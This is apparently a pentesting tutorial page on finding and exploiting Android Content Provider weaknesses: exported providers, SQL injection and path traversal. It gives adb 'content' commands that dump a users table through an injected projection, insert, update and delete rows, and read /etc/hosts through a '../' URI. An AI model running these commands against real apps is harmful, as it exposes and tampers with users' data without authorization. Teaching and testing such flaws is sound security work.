# Content Provider Hacking

**Overview**

Content Providers manage access to a structured set of data in Android applications. They encapsulate data and provide mechanisms for defining data security. They can be targeted for various vulnerabilities such as SQL Injection and Path-Traversal attacks.

**Key Areas of Focus**

1. **Exported Content Providers**
2. **SQL Injection Vulnerabilities**
3. **Path-Traversal Vulnerabilities**

***

### 1. Exported Content Providers

**What to Look For:**

* **Exported Providers**: Check if the Content Provider is exported in the `AndroidManifest.xml` file. An exported provider can be accessed by other applications.
* **Permissions**: Examine if the Content Provider is protected by permissions. If the `protectionLevel` is not set to `signature`, it might be circumvented.

```xml
<provider
    android:name="com.example.provider"
    android:authorities="com.example.provider"
    android:exported="true"
    android:permission="com.example.provider.READ_WRITE" />
```

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### 2. SQL Injection Vulnerabilities

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Steps to Identify:**

* **Check Query Methods**: Look at the `query` method to see if user inputs are properly sanitized.
* **Identify Tables**: Locate the tables used within the Content Provider by searching for `content://` URIs in the code.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Example Code to Identify SQL Injection Points:**

```java
String selection = "SELECT * FROM users WHERE username = ?";
Cursor cursor = db.rawQuery(selection, new String[]{username});
```

Now we need to identify the tables in the Java code. We can look for the keyword “`content://`“.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Example SQL Injection Attack:**

*   **Extract All Entries**:

    ```bash
    $ content query --uri content://com.example.provider/users --projection "* FROM users--"
    ```
*   **Inserting Data**:

    ```bash
    $ content insert --uri content://com.example.provider/users --bind name:s:admin
    ```
*   **Updating Data**:

    ```bash
    $ content update --uri content://com.example.provider/users --bind name:s:hacker --where "name='admin'"
    ```
*   **Deleting Data**:

    ```bash
    $ content delete --uri content://com.example.provider/users --where "name='admin'"
    ```

### 3. Path-Traversal Vulnerabilities

**Steps to Identify:**

* **Check Exported Providers**: Again, ensure the Content Provider is exported.
* **ParcelFileDescriptor**: Look for `ParcelFileDescriptor openFile` method and ensure the URI input is sanitized.

**Example Path-Traversal Attack:**

*   **Reading Arbitrary Files**:

    ```bash
    $ content read --uri content://com.example.provider/../../../../../../etc/hosts
    ```

#### Summary

When pentesting Content Providers in Android applications, focus on:

* Ensuring Content Providers are not improperly exported.
* Checking for SQL Injection vulnerabilities by examining how inputs are handled in query methods.
* Identifying and exploiting Path-Traversal vulnerabilities by verifying how file URIs are processed.

By thoroughly investigating these areas, you can identify and exploit significant vulnerabilities in Android applications' Content Providers.
